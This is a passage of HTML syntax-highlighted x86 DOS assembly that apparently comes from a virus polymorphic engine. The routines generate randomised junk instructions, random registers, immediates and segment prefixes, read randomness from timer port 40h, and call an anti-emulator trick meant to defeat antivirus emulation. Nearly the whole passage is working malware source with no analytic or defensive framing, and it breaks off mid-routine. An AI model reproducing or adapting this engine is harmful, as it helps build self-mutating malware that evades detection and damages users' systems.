        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">nocd21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_int</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_ah_disp</span><span class="sc0">
</span><span class="sc5">nocd21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_ah_disp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_antiemulator</span><span class="sc0">
</span><span class="sc5">no_ah_disp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_away_now</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_cd20</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">only_a_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20cdh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">stor_n_go</span><span class="sc0">
</span><span class="sc5">only_a_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_exit_put</span><span class="sc0">
</span><span class="sc5">no_cd20</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">with_el</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4cb4h</span><span class="sc0">                        </span><span class="sc1">; mov ah,4ch</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">sto21_n_go</span><span class="sc0">
</span><span class="sc5">with_el</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; random retrun code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                          </span><span class="sc1">; mov ax,4cxxh</span><span class="sc0">
</span><span class="sc5">sto21_n_go</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">21cdh</span><span class="sc0">                        </span><span class="sc1">; int 21h</span><span class="sc0">
</span><span class="sc5">stor_n_go</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">exit_exit_put</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">go_away_now</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">not_nop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc0">                         </span><span class="sc1">; not/neg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; basic opcode</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                           </span><span class="sc1">; register dependant</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">isneg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; change to not</span><span class="sc0">
</span><span class="sc5">isneg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; max pushes nested</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nopush</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nopush</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dopushpop</span><span class="sc0">                       </span><span class="sc1">; do push</span><span class="sc0">
</span><span class="sc5">nopush</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rolling</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; rol/ror... base oc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_increment</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc5">no_increment</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                 </span><span class="sc1">; the base</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">conv16to8</span><span class="sc0">               </span><span class="sc1">; 8 or 16 bit instruction?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; write the reg/op dipendant byte</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">three_bytes_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;mov reg,immediate</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">doalea</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                    </span><span class="sc1">;mov reg,[imm]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">domemcp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_real_lea</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">                 </span><span class="sc1">; write the fixed first byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">reget</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">         </span><span class="sc1">; select which 3 bytes to do</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_cmp_imm_check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">end_cmp_imm_check</span><span class="sc0">

</span><span class="sc5">do_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_compare</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jch_npt</span><span class="sc0">

</span><span class="sc5">end_cmp_imm_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">jch_npt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">            </span><span class="sc1">; generate instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">conv16to8</span><span class="sc0">               </span><span class="sc1">; 16 or 8 bit instruction?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                 </span><span class="sc1">; select the random immediate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">stor_chkjmp</span><span class="sc0">             </span><span class="sc1">; check for cmp and store</span><span class="sc0">

</span><span class="sc5">doalea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; may we create a 8 bit mov?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">mov16breg</span><span class="sc0">               </span><span class="sc1">; yeah, so select randomly which</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">dowith16b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc0">                 </span><span class="sc1">; mov reg8_low,imm</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">dowith16b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; high 8 bits</span><span class="sc0">
</span><span class="sc5">dowith16b</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">mov16breg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; mov reg,immediate</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gen_mpos</span><span class="sc0">

</span><span class="sc5">do_real_lea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc0">                 </span><span class="sc1">; store first lea byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; ah = used register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gen_mpos</span><span class="sc0">

</span><span class="sc5">domemcp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; select segment</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_seg_change</span><span class="sc0">           </span><span class="sc1">; nc? only DS:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">change_to_cs</span><span class="sc0">            </span><span class="sc1">; c? put CS:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">                 </span><span class="sc1">; nc? put ES:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_seg_change</span><span class="sc0">
</span><span class="sc5">change_to_cs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc0">                 </span><span class="sc1">; CS:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_seg_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; mov reg,seg:[imm]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">gen_mpos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07fffh</span><span class="sc0">                 </span><span class="sc1">;select immediate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_2_imms</span><span class="sc0">               </span><span class="sc1">; was an 8 bit instruction?</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_2_imms</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_random_dx_0f</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">do_random</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">do_real_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc1">;        ror     al,1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">do_real_random</span><span class="sc0">

        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">end_real_random</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_random</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_real_random</span><span class="sc0">

</span><span class="sc5">end_real_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_random</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">last_random</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">

</span><span class="sc5">instr_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">; generate new instruction</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_instr_change</span><span class="sc0">     </span><span class="sc1">; based on input register.</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">instr_change</span><span class="sc0">
</span><span class="sc5">finish_instr_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">conv16to8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">avante</span><span class="sc0">                  </span><span class="sc1">; only from ax to dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">avante</span><span class="sc0">                  </span><span class="sc1">; do 8 or 16?</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">avante</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                   </span><span class="sc1">; low 8 bits or high 8?</span><span class="sc0">
</span><span class="sc5">avante</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">int10_16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_get_cpos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; Get cursor position</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_int_10</span><span class="sc0">
</span><span class="sc5">no_get_cpos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
